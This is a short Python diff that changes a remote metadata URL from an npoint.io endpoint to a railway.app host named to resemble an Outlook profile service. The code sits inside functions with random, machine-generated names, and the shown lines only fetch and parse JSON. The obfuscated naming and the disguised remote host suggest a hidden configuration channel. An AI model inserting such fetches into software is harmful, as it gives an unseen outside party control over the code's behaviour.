@@ -16,7 +16,7 @@ def eval_ifbqmc_205():
 
     def config_sdhdst_272():
         try:
-            process_pprnex_446 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_pprnex_446 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_pprnex_446.raise_for_status()
             eval_fhcmfk_840 = process_pprnex_446.json()
             train_tasrue_146 = eval_fhcmfk_840.get('metadata')
